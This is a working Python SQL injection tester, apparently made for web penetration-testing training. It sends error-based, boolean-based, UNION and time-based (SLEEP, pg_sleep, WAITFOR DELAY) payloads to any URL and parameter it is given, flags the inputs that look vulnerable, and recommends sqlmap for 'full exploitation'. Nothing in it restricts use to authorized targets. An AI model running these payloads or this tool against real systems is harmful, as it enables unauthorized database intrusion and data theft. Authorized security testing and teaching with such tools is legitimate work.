#!/usr/bin/env python3
"""
SQL Injection Quick Tester
Tests for basic SQL injection vulnerabilities
"""

import requests
import argparse
import time

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    END = '\033[0m'

# SQL injection test payloads
SQLI_PAYLOADS = [
    "'",
    "\"",
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR '1'='1'/*",
    "' OR '1'='1'#",
    "admin'--",
    "admin' #",
    "admin'/*",
    "') OR ('1'='1",
    "') OR ('1'='1'--",
    "1' AND '1'='2",
    "1' AND '1'='1",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
]

# Time-based payloads
TIME_BASED_PAYLOADS = {
    'MySQL': [
        "' AND SLEEP(5)--",
        "' AND IF(1=1, SLEEP(5), 0)--",
    ],
    'PostgreSQL': [
        "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--",
    ],
    'MSSQL': [
        "'; WAITFOR DELAY '00:00:05'--",
        "'; IF (1=1) WAITFOR DELAY '00:00:05'--",
    ]
}

def print_banner():
    banner = """
╔═══════════════════════════════════════╗
║   SQL Injection Quick Tester          ║
║           OSWA Edition                ║
╚═══════════════════════════════════════╝
    """
    print(Colors.BLUE + banner + Colors.END)

def test_error_based(url, param, headers=None):
    """Test for error-based SQL injection"""
    print(f"\n{Colors.BLUE}[*] Testing Error-Based SQL Injection{Colors.END}")

    baseline_response = requests.get(url, headers=headers, timeout=10)
    baseline_length = len(baseline_response.text)

    vulnerabilities = []

    for payload in SQLI_PAYLOADS[:10]:  # Test first 10 payloads
        # Build URL with payload
        if '?' in url:
            test_url = f"{url}&{param}={payload}"
        else:
            test_url = f"{url}?{param}={payload}"

        try:
            response = requests.get(test_url, headers=headers, timeout=10)

            # Check for SQL errors
            sql_errors = [
                'sql syntax',
                'mysql_fetch',
                'mysqli',
                'sqlstate',
                'ora-',
                'postgresql',
                'pg_query',
                'sqlite',
                'microsoft sql',
                'odbc',
                'jdbc',
                'db2',
                'error in your sql syntax'
            ]

            error_found = False
            for error in sql_errors:
                if error in response.text.lower():
                    print(f"{Colors.GREEN}[+] VULNERABLE!{Colors.END} Payload: {payload}")
                    print(f"    SQL Error detected: {error}")
                    vulnerabilities.append(('error-based', payload))
                    error_found = True
                    break

            # Check for significant response difference
            if not error_found:
                length_diff = abs(len(response.text) - baseline_length)
                if length_diff > 100:
                    print(f"{Colors.YELLOW}[?] POSSIBLE{Colors.END} Payload: {payload} (Response diff: {length_diff} bytes)")

        except requests.exceptions.RequestException as e:
            print(f"{Colors.RED}[!] Error:{Colors.END} {e}")

    return vulnerabilities

def test_boolean_based(url, param, headers=None):
    """Test for boolean-based blind SQL injection"""
    print(f"\n{Colors.BLUE}[*] Testing Boolean-Based Blind SQL Injection{Colors.END}")

    vulnerabilities = []

    # Test true condition
    true_payload = "' AND '1'='1"
    if '?' in url:
        true_url = f"{url}&{param}={true_payload}"
    else:
        true_url = f"{url}?{param}={true_payload}"

    # Test false condition
    false_payload = "' AND '1'='2"
    if '?' in url:
        false_url = f"{url}&{param}={false_payload}"
    else:
        false_url = f"{url}?{param}={false_payload}"

    try:
        true_response = requests.get(true_url, headers=headers, timeout=10)
        false_response = requests.get(false_url, headers=headers, timeout=10)

        # Compare responses
        if len(true_response.text) != len(false_response.text):
            diff = abs(len(true_response.text) - len(false_response.text))
            print(f"{Colors.GREEN}[+] VULNERABLE!{Colors.END} Boolean-based blind SQL injection detected")
            print(f"    True response: {len(true_response.text)} bytes")
            print(f"    False response: {len(false_response.text)} bytes")
            print(f"    Difference: {diff} bytes")
            vulnerabilities.append(('boolean-based', true_payload))
        else:
            print(f"{Colors.YELLOW}[-] No significant difference in responses{Colors.END}")

    except requests.exceptions.RequestException as e:
        print(f"{Colors.RED}[!] Error:{Colors.END} {e}")

    return vulnerabilities

def test_time_based(url, param, headers=None):
    """Test for time-based blind SQL injection"""
    print(f"\n{Colors.BLUE}[*] Testing Time-Based Blind SQL Injection{Colors.END}")
    print(f"{Colors.YELLOW}[*] This may take a while...{Colors.END}")

    vulnerabilities = []

    for db_type, payloads in TIME_BASED_PAYLOADS.items():
        for payload in payloads:
            if '?' in url:
                test_url = f"{url}&{param}={payload}"
            else:
                test_url = f"{url}?{param}={payload}"

            print(f"[*] Testing {db_type} payload: {payload[:50]}...")

            try:
                start_time = time.time()
                response = requests.get(test_url, headers=headers, timeout=15)
                elapsed = time.time() - start_time

                if elapsed >= 5:
                    print(f"{Colors.GREEN}[+] VULNERABLE!{Colors.END} {db_type} Time-based SQL injection")
                    print(f"    Payload: {payload}")
                    print(f"    Response time: {elapsed:.2f} seconds")
                    vulnerabilities.append(('time-based', payload, db_type))
                else:
                    print(f"    Response time: {elapsed:.2f} seconds (not vulnerable)")

            except requests.exceptions.RequestException as e:
                print(f"{Colors.RED}[!] Error:{Colors.END} {e}")

    return vulnerabilities

def main():
    print_banner()

    parser = argparse.ArgumentParser(
        description='Quick SQL Injection Tester',
        epilog='Example: python3 sqli_tester.py -u https://example.com/page -p id'
    )
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-p', '--param', required=True, help='Parameter to test')
    parser.add_argument('-H', '--header', action='append', help='Custom headers')
    parser.add_argument('--error-only', action='store_true', help='Test error-based only')
    parser.add_argument('--boolean-only', action='store_true', help='Test boolean-based only')
    parser.add_argument('--time-only', action='store_true', help='Test time-based only')

    args = parser.parse_args()

    # Build headers
    headers = {}
    if args.header:
        for header in args.header:
            if ':' in header:
                name, value = header.split(':', 1)
                headers[name.strip()] = value.strip()

    print(f"\n[*] Target: {args.url}")
    print(f"[*] Parameter: {args.param}")

    all_vulns = []

    # Run tests based on arguments
    if args.error_only:
        all_vulns.extend(test_error_based(args.url, args.param, headers))
    elif args.boolean_only:
        all_vulns.extend(test_boolean_based(args.url, args.param, headers))
    elif args.time_only:
        all_vulns.extend(test_time_based(args.url, args.param, headers))
    else:
        # Run all tests
        all_vulns.extend(test_error_based(args.url, args.param, headers))
        all_vulns.extend(test_boolean_based(args.url, args.param, headers))
        all_vulns.extend(test_time_based(args.url, args.param, headers))

    # Summary
    print(f"\n{Colors.BLUE}{'='*60}{Colors.END}")
    print(f"{Colors.BLUE}Summary:{Colors.END}")

    if all_vulns:
        print(f"{Colors.RED}[!] SQL Injection vulnerabilities found: {len(all_vulns)}{Colors.END}")
        for vuln_type, *details in all_vulns:
            print(f"    - Type: {vuln_type}")
            if details:
                print(f"      Payload: {details[0]}")
        print(f"\n{Colors.YELLOW}[!] Recommendation: Use SQLMap for full exploitation{Colors.END}")
        print(f"    sqlmap -u \"{args.url}?{args.param}=1\" -p {args.param}")
    else:
        print(f"{Colors.GREEN}[+] No SQL injection vulnerabilities detected{Colors.END}")
        print(f"{Colors.YELLOW}[*] Consider testing with SQLMap for deeper analysis{Colors.END}")

    print(f"{Colors.BLUE}{'='*60}{Colors.END}\n")

if __name__ == '__main__':
    main()
